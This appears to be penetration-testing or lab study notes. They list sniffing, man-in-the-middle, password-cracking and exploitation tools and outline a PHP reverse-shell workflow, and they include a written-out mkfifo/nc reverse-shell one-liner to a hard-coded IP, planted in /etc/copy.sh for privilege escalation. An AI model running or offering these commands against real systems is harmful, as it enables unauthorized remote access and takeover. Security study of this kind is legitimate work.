
Goal:
- Infiltrate the infrastructure by exploiting security weaknesses!


Gaining System Access Methods:
- Sniffing Attack
- Man-in-the-Middle Attack
- Password Attack
- Exploitation to Vulnerabilities


Sniffing Attack (Network Packet Capture)
- [Wireshark]
- [Tshark]
- [tcpdump]

Man-in-the-Middle (MITM) Attack Tools
- [Ettercap]
- [Bettercap]

Password Attack (Authentication Attack) Tools
- [JtR]: Single Mode / Wordlist / Brute-Force
- [hydra]: Wordlist Attack
- [crunch]: Hybrid Dictionary Attack [crunch]
- [RainbowCrack]: Rainbow Tables <http://project-rainbowcrack.com/table.htm>

Exploitation Attack to Vulnerabilities Tools
- [BeEF]
- [MetaSploit]
- [SQLMap]
- [Manual]: Find the vulnerability and exploit with searchsploi, read it, and run it with python.


Reverse Shell
- [PHP] 
    - Run Listening Server <nc -vnlp 4444>
    - Modify LHOST and LPORT in revers-shell.php
    - Upload and Run reverse-shell
    - Upgrade shell <python3 -c 'import pty;pty.spawn("/bin/bash")'>
    - Privilege Escalation <echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.162.130 4445 >/tmp/f" > /etc/copy.sh>
- [WordPress]
    - Run
    
Python2 to Python3 convertor
- [2to3] <pip install 2to3>
- 2to3 [file or folder] -w
